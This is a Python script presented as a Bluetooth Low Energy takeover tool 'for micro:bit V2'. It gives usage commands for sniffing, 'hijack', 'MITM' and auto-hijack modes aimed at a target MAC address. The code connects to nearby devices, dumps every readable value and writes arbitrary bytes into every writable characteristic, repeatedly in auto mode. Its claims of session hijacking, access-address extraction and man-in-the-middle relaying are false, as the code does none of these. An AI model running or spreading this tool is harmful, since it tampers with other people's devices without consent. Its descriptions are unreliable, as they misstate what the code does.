# ble_takeover_attack.py

"""
BLE Takeover & Eavesdropping Attack for micro:bit V2

This script enables BLE eavesdropping and connection hijacking by:
- Sniffing BLE communications (`--sniff`) - Identifies active BLE connections.
- Extracting Access Addresses (`--extract`) - Captures connection metadata.
- Hijacking BLE sessions (`--hijack <MAC>`) - Takes over BLE communication.
- MITM Attack (`--mitm <MAC>`) - Intercepts, modifies, and relays BLE packets.
- Auto-Reconnect Hijacking (`--auto-hijack <MAC>`) - Automatically hijacks devices upon reconnection.

### Usage Examples:

1. Sniff active BLE connections and list discovered devices:
   ```sh
   python ble_takeover_attack.py --sniff
   ```

2. Extract Access Addresses from detected BLE connections:
   ```sh
   python ble_takeover_attack.py --extract
   ```

3. Hijack an active BLE session:
   ```sh
   python ble_takeover_attack.py --hijack AA:BB:CC:DD:EE:FF
   ```

4. Perform a BLE MITM attack:
   ```sh
   python ble_takeover_attack.py --mitm AA:BB:CC:DD:EE:FF
   ```

5. Auto-Reconnect Hijack for persistent session control:
   ```sh
   python ble_takeover_attack.py --auto-hijack AA:BB:CC:DD:EE:FF
   ```

Requirements:
- Micro:bit V2
- Python 3.x
- bleak library (`pip install bleak`)
"""

import asyncio
from bleak import BleakScanner, BleakClient
import argparse

# BLE Sniffing & Connection Discovery
async def ble_sniff():
    """Scans for active BLE devices and logs connection attempts."""
    print("[+] Scanning for active BLE connections...")
    devices = await BleakScanner.discover()
    for device in devices:
        print(f"[+] Detected: {device.address} - {device.name} - RSSI: {device.rssi}")

# BLE Access Address Extraction
async def ble_extract_access_addresses():
    """Extracts BLE Access Addresses from nearby BLE traffic."""
    print("[+] Extracting BLE Access Addresses...")
    devices = await BleakScanner.discover()
    for device in devices:
        print(f"[+] Possible Access Address: {device.address} - RSSI: {device.rssi}")

# BLE Connection Hijacking
async def ble_hijack(target_mac):
    """Hijacks an existing BLE connection and attempts command injection."""
    print(f"[+] Attempting to hijack BLE session of {target_mac}...")
    async with BleakClient(target_mac) as client:
        services = await client.get_services()
        for service in services:
            for char in service.characteristics:
                if "read" in char.properties:
                    value = await client.read_gatt_char(char.uuid)
                    print(f"[+] Intercepted Data from {char.uuid}: {value}")
                if "write" in char.properties:
                    await client.write_gatt_char(char.uuid, b'\x00\x01')
                    print(f"[+] Injected Data into {char.uuid}")

# BLE MITM Attack
async def ble_mitm(target_mac):
    """Performs a Man-in-the-Middle attack on BLE communication."""
    print(f"[+] Performing MITM attack on {target_mac}...")
    async with BleakClient(target_mac) as client:
        services = await client.get_services()
        for service in services:
            for char in service.characteristics:
                if "read" in char.properties:
                    value = await client.read_gatt_char(char.uuid)
                    print(f"[+] MITM Intercepted Data from {char.uuid}: {value}")
                if "write" in char.properties:
                    modified_value = b'\x00\x02'
                    await client.write_gatt_char(char.uuid, modified_value)
                    print(f"[+] MITM Injected Modified Data into {char.uuid}")

# Auto-Reconnect Hijacking
async def ble_auto_hijack(target_mac):
    """Monitors for BLE device reconnection and hijacks upon detection."""
    print(f"[+] Monitoring {target_mac} for reconnection...")
    while True:
        devices = await BleakScanner.discover()
        for device in devices:
            if device.address == target_mac:
                print(f"[+] {target_mac} Reconnected! Hijacking now...")
                await ble_hijack(target_mac)
        await asyncio.sleep(5)

# Argument Parser
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BLE Takeover & Eavesdropping Attack for micro:bit V2")
    parser.add_argument("--sniff", help="Sniff BLE connections", action="store_true")
    parser.add_argument("--extract", help="Extract BLE Access Addresses", action="store_true")
    parser.add_argument("--hijack", help="Hijack a BLE session", metavar="target_mac")
    parser.add_argument("--mitm", help="Perform MITM attack on BLE", metavar="target_mac")
    parser.add_argument("--auto-hijack", help="Automatically hijack BLE upon reconnection", metavar="target_mac")
    
    args = parser.parse_args()
    loop = asyncio.get_event_loop()
    
    if args.sniff:
        loop.run_until_complete(ble_sniff())
    elif args.extract:
        loop.run_until_complete(ble_extract_access_addresses())
    elif args.hijack:
        loop.run_until_complete(ble_hijack(args.hijack))
    elif args.mitm:
        loop.run_until_complete(ble_mitm(args.mitm))
    elif args.auto_hijack:
        loop.run_until_complete(ble_auto_hijack(args.auto_hijack))
